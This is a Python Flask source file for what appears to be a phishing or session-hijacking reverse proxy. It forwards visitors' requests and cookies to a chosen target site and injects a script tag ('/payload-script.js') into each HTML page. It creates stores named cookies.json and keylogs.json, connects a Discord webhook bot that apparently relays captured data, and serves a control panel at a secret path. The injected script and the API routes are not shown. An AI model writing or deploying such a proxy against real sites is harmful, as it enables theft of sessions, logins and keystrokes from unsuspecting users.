from flask import Flask, request, Response, send_from_directory, jsonify
import requests
import re
import json
import os
from datetime import datetime
import brotli
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot
from colorama import Fore
from functools import wraps

# Initialize components
db = Database()
detector = DataDetector()
discord_bot = None
requests_history = []
MAX_HISTORY = 100

def initialize_discord_bot():
    global discord_bot
    settings = db.get_discord_settings()
    if settings['discord_webhook'] and settings['discord_token']:
        try:
            discord_bot = DiscordBot(settings['discord_webhook'], settings['discord_token'])
            print(f"{Fore.GREEN}[+] Discord bot initialized successfully!{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Discord bot initialization failed: {str(e)}{Fore.RESET}")

# Initialize storage
def ensure_json_files():
    files = ['cookies.json', 'requests.json', 'keylogs.json']
    for file in files:
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump([], f)

ensure_json_files()
initialize_discord_bot()

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        if path.startswith(secret):
            if path == secret:
                return panel_index()
            filename = path[len(secret)+1:]
            return send_from_directory('panel', filename)

        target_url = f"https://{target}/{path}"
        if request.query_string:
            target_url += f"?{request.query_string.decode()}"

        headers = {
            key: value for key, value in request.headers.items()
            if key.lower() not in ['host', 'content-length']
        }
        headers['Host'] = target

        try:
            resp = requests.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=True
            )

            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
            headers = [
                (k, v) for k, v in resp.raw.headers.items()
                if k.lower() not in excluded_headers
            ]

            # Process response content
            content = resp.content
            if 'text/html' in resp.headers.get('Content-Type', '').lower():
                try:
                    content = content.decode('utf-8')
                    payload = '<script src="/payload-script.js"></script>'
                    if '</head>' in content:
                        content = content.replace('</head>', f'{payload}</head>')
                    elif '<body>' in content:
                        content = content.replace('<body>', f'<body>{payload}')
                    content = content.encode('utf-8')
                except:
                    pass

            return Response(content, resp.status_code, headers)

        except Exception as e:
            return str(e), 500

    # ... (keep all your existing API routes) ...

    print(f"\n[*] Panel URL: http://{host}:{port}/{secret}")
    print(f"[*] Proxy running on http://{host}:{port}/")
    app.run(host='0.0.0.0', port=port, threaded=True)